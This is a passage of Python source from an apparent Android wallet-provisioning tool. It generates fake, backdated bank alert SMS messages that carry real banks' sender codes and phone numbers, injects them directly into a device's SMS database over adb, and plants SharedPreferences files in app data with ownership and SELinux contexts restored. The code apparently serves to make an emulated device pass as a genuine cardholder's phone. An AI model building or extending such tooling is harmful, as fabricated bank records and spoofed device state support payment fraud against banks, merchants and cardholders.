        total = len(checks)
        checks["score"] = f"{passed}/{total}"
        checks["passed"] = passed
        checks["total"] = total

        logger.info(f"  Wallet verification: {passed}/{total} checks passed")
        return checks

    # ─── CARD-AWARE BANK SMS ──────────────────────────────────────────

    def _inject_card_sms(self, last4: str, issuer: str,
                          network_info: Dict, result: WalletProvisionResult):
        """Inject realistic bank notification SMS for card transactions."""
        try:
            now_ms = int(time.time() * 1000)
            network_name = network_info["name"]

            SMS_TEMPLATES = [
                "Your {issuer} {network} ending in {last4} was used for ${amount:.2f} at {merchant}. If not you, call {phone}.",
                "{issuer} Alert: Transaction of ${amount:.2f} on card ending {last4} at {merchant} approved.",
                "Purchase alert: ${amount:.2f} charged to your {network} ****{last4}. {merchant}. Avail bal: ${bal:.2f}",
                "{issuer}: Your {network} card ending in {last4} has been added to Google Pay.",
                "Alert: Your {issuer} card ****{last4} payment of ${amount:.2f} to {merchant} was successful.",
                "{issuer}: A purchase of ${amount:.2f} was made with your card ending in {last4}. Reply STOP to opt out.",
            ]

            MERCHANTS = [
                "AMAZON.COM", "WALMART.COM", "TARGET", "SPOTIFY USA",
                "NETFLIX.COM", "UBER TRIP", "DOORDASH", "GOOGLE *SERVICES",
                "APPLE.COM/BILL", "STEAM PURCHASE",
            ]

            BANK_PHONES = {
                "Chase": "1-800-935-9935", "Bank of America": "1-800-432-1000",
                "Capital One": "1-800-227-4825", "Citi": "1-800-950-5114",
                "Wells Fargo": "1-800-869-3557", "US Bank": "1-800-872-2657",
                "USAA": "1-800-531-8722", "Navy Federal": "1-888-842-6328",
                "Barclays": "0345-734-5345", "HSBC": "0345-740-4404",
                "Monzo": "0800-802-1281", "Revolut": "+44-20-3322-8352",
            }

            SENDER = {
                "Chase": "33789", "Bank of America": "73981",
                "Capital One": "227462", "Citi": "95686",
                "Wells Fargo": "93557", "US Bank": "872265",
                "USAA": "531872", "Navy Federal": "842632",
                "Barclays": "BARCLAYS", "HSBC": "HSBC",
                "Monzo": "MONZO", "Revolut": "REVOLUT",
            }

            phone = BANK_PHONES.get(issuer, "1-800-000-0000")
            sender = SENDER.get(issuer, "72000")
            num_sms = random.randint(3, 8)
            sql_parts = []

            for i in range(num_sms):
                age_days = random.randint(1, 28)
                sms_ts = now_ms - (age_days * 86400000) - random.randint(0, 43200000)
                amount = round(random.uniform(4.99, 189.99), 2)
                bal = round(random.uniform(850.0, 12500.0), 2)
                merchant = random.choice(MERCHANTS)

                if i == 0:
                    tmpl = "{issuer}: Your {network} card ending in {last4} has been added to Google Pay."
                else:
                    tmpl = random.choice(SMS_TEMPLATES)

                body = tmpl.format(
                    issuer=issuer, network=network_name, last4=last4,
                    amount=amount, merchant=merchant, phone=phone, bal=bal,
                )

                sql_parts.append(
                    f"INSERT INTO sms(address,body,type,date,read,seen) "
                    f"VALUES('{sender}','{body.replace(chr(39), str())}',1,{sms_ts},1,1)"
                )

            # Batch insert via sqlite3 (content provider freezes on Cuttlefish)
            if sql_parts:
                DB = "/data/data/com.android.providers.telephony/databases/mmssms.db"
                sql_batch = ";".join(sql_parts)
                _adb_shell(self.target, f'sqlite3 {DB} "{sql_batch}"')
            logger.info(f"  Bank SMS: {num_sms} notifications from {issuer} ({sender})")

        except Exception as e:
            result.errors.append(f"card_sms: {e}")
            logger.error(f"Card SMS injection failed: {e}")

    # ─── HELPERS ──────────────────────────────────────────────────────

    def _build_shared_prefs_xml(self, data: Dict[str, str]) -> str:
        """Build Android SharedPreferences XML."""
        lines = ['<?xml version=\'1.0\' encoding=\'utf-8\' standalone=\'yes\' ?>']
        lines.append("<map>")
        for key, value in data.items():
            escaped = (
                str(value).replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;").replace("'", "&apos;")
            )
            if value.lower() in ("true", "false"):
                lines.append(f'    <boolean name="{key}" value="{value.lower()}" />')
            elif value.isdigit() and len(value) < 18:
                lines.append(f'    <long name="{key}" value="{value}" />')
            else:
                lines.append(f'    <string name="{key}">{escaped}</string>')
        lines.append("</map>")
        return "\n".join(lines)

    def _push_shared_prefs_xml(self, remote_path: str, data: Dict[str, str], package: str):
        """Write SharedPreferences XML to device."""
        xml = self._build_shared_prefs_xml(data)
        with tempfile.NamedTemporaryFile(suffix=".xml", delete=False, mode="w") as tmp:
            tmp.write(xml)
            tmp_path = tmp.name

        prefs_dir = os.path.dirname(remote_path)
        _adb_shell(self.target, f"mkdir -p {prefs_dir}")
        _adb_push(self.target, tmp_path, remote_path)
        self._fix_ownership(remote_path, package)
        os.unlink(tmp_path)

    def _fix_ownership(self, remote_path: str, package: str):
        """Fix file ownership and SELinux context to match app UID."""
        uid = _adb_shell(self.target,
            f"stat -c %U /data/data/{package} 2>/dev/null || "
            f"ls -ld /data/data/{package} | awk '{{print $3}}'")
        uid = uid.strip()
        if uid:
            _adb_shell(self.target, f"chown {uid}:{uid} {remote_path}")
        _adb_shell(self.target, f"chmod 660 {remote_path}")
        # Restore SELinux context — without this, apps get permission denied
        parent_dir = remote_path.rsplit("/", 1)[0] if "/" in remote_path else remote_path
        _adb_shell(self.target, f"restorecon -R {parent_dir} 2>/dev/null")
